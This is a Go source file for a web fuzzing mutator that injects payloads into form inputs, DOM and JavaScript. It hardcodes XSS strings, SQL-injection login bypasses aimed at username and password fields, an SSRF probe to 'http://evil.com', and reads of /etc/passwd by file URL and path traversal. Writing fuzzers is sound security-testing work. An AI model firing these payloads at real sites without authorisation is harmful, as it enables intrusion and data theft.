/*
Author: KleaSCM
Email: KleaSCM@gmail.com
File: mutator.go
Description: AdvancedWebMutator implementation. Provides context-aware, adaptive, and grammar-based
mutations for web fuzzing. Supports XSS, SQLi, CSRF, SSRF, path traversal, logic bugs, DOM/JS mutation,
and dictionary-based payloads. Designed for extensibility and integration with advanced web fuzzing engine.
*/

package web

import (
	"math/rand"
	"strings"
)

type AdvancedWebMutator struct {
	wordlist      []string
	lastReflected map[string]string // For adaptive mutation
}

func NewAdvancedWebMutator(wordlist []string) *AdvancedWebMutator {
	return &AdvancedWebMutator{
		wordlist:      wordlist,
		lastReflected: make(map[string]string),
	}
}

func (m *AdvancedWebMutator) MutateInputs(inputs map[string]string) map[string]string {
	payloads := []string{
		// XSS
		"<script>alert(1)</script>",
		"\"'><img src=x onerror=alert(2)>",
		"<svg/onload=alert(3)>",
		// SQLi
		"' OR '1'='1;--",
		"admin' --",
		"' OR 1=1--",
		// CSRF/SSRF
		"http://evil.com",
		"file:///etc/passwd",
		// Path traversal
		"../../../../etc/passwd",
		// Logic bugs
		"0",
		"-1",
		"999999999",
	}
	// Add dictionary/wordlist
	payloads = append(payloads, m.wordlist...)

	mutated := make(map[string]string)
	for k, v := range inputs {
		// Adaptive: if last reflected, try to mutate further
		if ref, ok := m.lastReflected[k]; ok && ref != "" {
			mutated[k] = ref + payloads[rand.Intn(len(payloads))]
			continue
		}
		// Context-aware: choose payload based on input name
		if strings.Contains(strings.ToLower(k), "user") || strings.Contains(strings.ToLower(k), "name") {
			mutated[k] = "admin' --"
		} else if strings.Contains(strings.ToLower(k), "pass") {
			mutated[k] = "' OR '1'='1"
		} else if strings.Contains(strings.ToLower(k), "url") || strings.Contains(strings.ToLower(k), "link") {
			mutated[k] = "http://evil.com"
		} else {
			mutated[k] = v + payloads[rand.Intn(len(payloads))]
		}
	}
	return mutated
}

func (m *AdvancedWebMutator) MutateDOM(dom string) string {
	// Insert/remove/modify nodes, fuzz event handlers
	if rand.Float64() < 0.2 {
		return dom + "<script>console.log('dom fuzz')</script>"
	}
	if rand.Float64() < 0.1 {
		return strings.Replace(dom, "<form", "<form onsubmit=alert('fuzz')", 1)
	}
	return dom
}

func (m *AdvancedWebMutator) MutateJS(js string) string {
	// Inject/fuzz inline/external JS, variables, functions, event listeners
	if rand.Float64() < 0.2 {
		return js + ";window.fuzzed=true;alert('js fuzz')"
	}
	if rand.Float64() < 0.1 {
		return "function fuzz() { throw 'fuzzed'; }" + js
	}
	return js
}

func (m *AdvancedWebMutator) Name() string { return "AdvancedWebMutator" }
func (m *AdvancedWebMutator) Description() string {
	return "Context-aware, adaptive, and grammar-based web input, DOM, and JS mutation"
}

// For adaptive mutation: update last reflected values
func (m *AdvancedWebMutator) UpdateReflected(inputs map[string]string, dom string) {
	for k, v := range inputs {
		if v != "" && strings.Contains(dom, v) {
			m.lastReflected[k] = v
		}
	}
}
